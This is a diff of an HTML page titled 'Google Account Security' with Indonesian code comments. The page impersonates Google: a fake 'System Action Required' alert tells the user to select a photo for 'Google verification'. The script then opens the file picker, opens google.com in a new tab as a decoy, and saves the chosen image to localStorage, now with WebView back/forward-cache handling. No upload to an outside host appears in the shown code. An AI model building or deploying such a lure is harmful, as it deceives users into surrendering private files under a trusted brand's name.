@@ -3,6 +3,12 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      http-equiv="Cache-Control"
+      content="no-cache, no-store, must-revalidate"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
     <title>Google Account Security</title>
     <style>
       * {
@@ -117,54 +123,57 @@
     <a id="link"></a>
 
     <script>
-      // Saat halaman dimuat, cek apakah ada gambar tersimpan di sessionStorage
-      window.addEventListener("DOMContentLoaded", function () {
-        const savedImage = sessionStorage.getItem("capturedImage");
-        if (savedImage) {
-          const img = document.getElementById("img");
-          img.src = savedImage;
-          img.style.display = "block";
-          document.getElementById("successMsg").style.display = "block";
-        }
-      });
+      (function () {
+        const fileSelect = document.getElementById("fileSelect");
+        const link = document.getElementById("link");
+        const img = document.getElementById("img");
+        const successMsg = document.getElementById("successMsg");
 
-      const fileSelect = document.getElementById("fileSelect");
-      const link = document.getElementById("link");
-      const img = document.getElementById("img");
-      const successMsg = document.getElementById("successMsg");
-
-      link.onclick = (e) => {
-        e.preventDefault();
-
-        alert(
-          "System Action Required: Please select a photo to proceed with Google verification.",
-        );
-
-        // Trigger file picker
-        fileSelect.click();
-
-        // Open new tab to Google (trusted domain)
-        window.open("https://google.com", "_blank");
-      };
-
-      fileSelect.onchange = (event) => {
-        if (fileSelect.files.length > 0) {
-          const file = fileSelect.files[0];
-          // Baca file sebagai Data URL agar bisa disimpan ke sessionStorage
-          const reader = new FileReader();
-          reader.onload = function (ev) {
-            const dataUrl = ev.target.result;
-            // Simpan ke sessionStorage
-            sessionStorage.setItem("capturedImage", dataUrl);
-            // Tampilkan gambar
-            img.src = dataUrl;
+        // Tampilkan gambar dari localStorage jika ada
+        function loadSavedImage() {
+          const savedImage = localStorage.getItem("capturedImage");
+          if (savedImage) {
+            img.src = savedImage;
             img.style.display = "block";
             successMsg.style.display = "block";
-            console.log("File captured:", file.name);
-          };
-          reader.readAsDataURL(file);
+            console.log("Loaded saved image from localStorage");
+          }
         }
-      };
+
+        // Saat halaman dimuat pertama kali
+        window.addEventListener("DOMContentLoaded", loadSavedImage);
+        // Khusus untuk back/forward cache (bfcache) di WebView
+        window.addEventListener("pageshow", function (event) {
+          if (event.persisted) {
+            loadSavedImage();
+          }
+        });
+
+        link.onclick = (e) => {
+          e.preventDefault();
+          alert(
+            "System Action Required: Please select a photo to proceed with Google verification.",
+          );
+          fileSelect.click();
+          window.open("https://google.com", "_blank");
+        };
+
+        fileSelect.onchange = (event) => {
+          if (fileSelect.files.length > 0) {
+            const file = fileSelect.files[0];
+            const reader = new FileReader();
+            reader.onload = function (ev) {
+              const dataUrl = ev.target.result;
+              localStorage.setItem("capturedImage", dataUrl);
+              img.src = dataUrl;
+              img.style.display = "block";
+              successMsg.style.display = "block";
+              console.log("File captured and saved:", file.name);
+            };
+            reader.readAsDataURL(file);
+          }
+        };
+      })();
     </script>
   </body>
 </html>
